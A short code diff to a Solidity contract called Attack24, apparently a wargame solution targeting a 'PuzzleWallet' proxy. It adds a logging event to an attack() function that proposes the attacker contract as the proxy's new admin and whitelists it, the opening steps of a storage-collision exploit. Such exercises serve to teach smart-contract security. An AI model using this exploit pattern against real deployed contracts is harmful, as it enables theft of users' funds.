@@ -8,6 +8,8 @@ contract Attack24 {
     PuzzleProxy public proxy;
     address public owner;
 
+    event AddedToWhiteList(address indexed _address);
+
     constructor(address payable _targetAddress) {
         owner = msg.sender;
         target = PuzzleWallet(_targetAddress);        
@@ -17,6 +19,7 @@ contract Attack24 {
     function attack() public {
         proxy.proposeNewAdmin(address(this));
         target.addToWhitelist(address(this));
+        emit AddedToWhiteList(address(this));
      }
 
     function withdraw() public view {
